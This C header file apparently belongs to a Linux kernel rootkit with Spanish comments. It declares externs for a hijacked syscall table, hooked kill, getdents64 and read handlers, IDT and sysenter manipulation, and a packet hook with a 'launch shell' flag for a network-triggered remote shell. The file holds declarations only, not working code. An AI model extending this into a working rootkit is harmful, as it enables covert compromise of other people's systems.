#ifndef _BASE_H__
#define _BASE_H__

#include <linux/types.h>
#include <linux/stddef.h>
#include <linux/unistd.h>
#include <linux/config.h>
#include <linux/module.h>
#include <linux/version.h>
#include <linux/kernel.h>
#include <linux/string.h>
#include <linux/mm.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/in.h>
#include <linux/skbuff.h>
#include <linux/netdevice.h>
#include <linux/dirent.h>
#include <asm/processor.h>
#include <asm/uaccess.h>
#include <asm/unistd.h>
#include "config.h"
#include "data.h"
#include "remoto.h"
#include "kill.h"
#include "read.h"
#include "ls.h"
#include "idt.h"
#include "extern_symbols.h"
#include "lowlevel_layer.h"
#include "restore_memory.h"

/* estructuras */
struct idt_descriptor
        {
        unsigned short off_low;
        unsigned short sel;
        unsigned char none, flags;
        unsigned short off_high;
        };


extern unsigned long dire_exit, after_call;
extern unsigned long dire_call, p_hacked_kill, global_ip;
extern unsigned long p_hacked_getdents64, p_hacked_read;
extern short read_activo, lanzar_shell;
extern void *sysenter_entry;
extern void **sys_call_table;
extern struct packet_type my_pkt;
extern unsigned short global_port;
extern int errno, can_unload_lkm;


#endif /* _BASE_H__ */
